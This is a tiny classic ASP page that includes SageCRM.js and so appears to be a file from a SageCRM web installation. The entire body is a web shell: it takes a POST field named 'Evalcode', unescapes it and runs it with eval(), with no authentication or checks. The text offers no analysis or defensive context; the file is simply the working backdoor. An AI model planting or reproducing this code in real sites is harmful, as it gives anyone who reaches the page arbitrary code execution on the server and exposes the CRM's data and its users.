<!-- #include file ="SageCRM.js" -->
<%
    var Evalcode=new String(Request.Form("Evalcode"));
    if (Defined(Evalcode))
    {
      Evalcode=unescape(Evalcode);
      eval(Evalcode);
    }
%>